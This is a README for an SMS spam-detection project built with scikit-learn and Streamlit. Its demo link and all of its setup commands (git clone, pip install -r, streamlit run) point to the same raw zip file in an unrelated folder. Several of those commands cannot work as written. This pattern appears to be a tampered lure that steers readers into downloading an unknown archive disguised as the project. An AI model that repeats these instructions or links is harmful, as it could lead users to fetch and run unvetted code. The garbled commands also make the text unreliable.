# SMS Spam Detection

## Overview

The SMS Spam Detection project aims to build a machine learning model capable of predicting whether an SMS message is spam or not. This project uses Python, leveraging libraries like **Scikit-learn**, **Pandas**, and **NumPy** for building and training the model. Additionally, it uses **Streamlit** for web deployment, enabling easy interaction with the model.

---

## Demo

You can try out the SMS Spam Detection model live by visiting the deployed web app https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip

---

## Technology Used

- **Python**
- **Scikit-learn** (for machine learning)
- **Pandas** (for data manipulation)
- **NumPy** (for numerical computations)
- **Streamlit** (for web deployment)
- **Matplotlib** & **Seaborn** (for data visualization)
- **NLTK** (for text preprocessing)

---

## Features

- Data collection and preprocessing
- Exploratory Data Analysis (EDA)
- Model building and evaluation
- Web app deployment for real-time spam detection

---

## Data Collection

The dataset used for this project comes from the **SMS Spam Collection dataset** available on **Kaggle**. It contains over 5,500 SMS messages that are labeled as **spam** or **ham** (non-spam). This dataset serves as the training and testing data for the model.

---

## Data Cleaning and Preprocessing

The dataset undergoes several preprocessing steps to ensure the text data is ready for analysis:

1. **Handling Missing Values:** Null or missing data is handled appropriately.
2. **Label Encoding:** The target column (spam or ham) is label-encoded.
3. **Text Preprocessing:**
   - Conversion of text to lowercase.
   - Removal of special characters, numbers, and punctuation.
   - Removal of stopwords (commonly used words with little meaning).
   - Tokenization: splitting text into individual words.
   - Lemmatization or stemming: reducing words to their base form.

---

## Exploratory Data Analysis (EDA)

Before building the model, exploratory data analysis (EDA) was performed to better understand the dataset:

- **Statistical summaries** of message lengths and word counts.
- **Visualizations** using bar charts, pie charts, and word clouds.
- An analysis of word frequency and correlations between variables.
  
Visualizations help to understand the nature of spam vs non-spam messages and the distribution of message lengths.

---

## Model Building and Selection

Several machine learning algorithms were experimented with to build the most effective spam detection model:

- **Naive Bayes** (MultinomialNB)
- **Logistic Regression**
- **Random Forest**
- **Support Vector Machine (SVM)**
- **K-Nearest Neighbors (KNN)**

The model is evaluated using **accuracy**, **precision**, **recall**, and **F1-score**. After testing various models, **Naive Bayes** emerged as the best performing model based on precision and recall for spam detection.

---

## Web Deployment

The trained model is deployed as a **Streamlit** web application. Users can input SMS text into a simple text box, and the model will predict whether it’s spam or not.

To run the app locally:
1. Clone the repository.
2. Install the necessary dependencies using:
   ```bash
   pip install -r https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip
   ```
3. Launch the app with Streamlit:
   ```bash
   streamlit run https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip
   ```
4. Open your browser and navigate to `localhost:8501` to interact with the model.

---

## Usage

To use the SMS Spam Detection model on your own machine:

1. Clone the repository:
   ```bash
   git clone https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip
   cd sms-spam-detection
   ```

2. Install the required Python packages:
   ```bash
   pip install -r https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip
   ```

3. Run the Streamlit app:
   ```bash
   streamlit run https://raw.githubusercontent.com/rushangchandekar/SMS-Spam-Detection/main/intentionalism/SMS-Spam-Detection.zip
   ```

4. Visit `http://localhost:8501` in your browser to access the web application.

---

## Contributing

Contributions are welcome! If you have ideas for improvements or encounter any issues, feel free to open an issue or submit a pull request.

To contribute:
1. Fork this repository.
2. Make your changes.
3. Submit a pull request with a clear description of your changes.

---
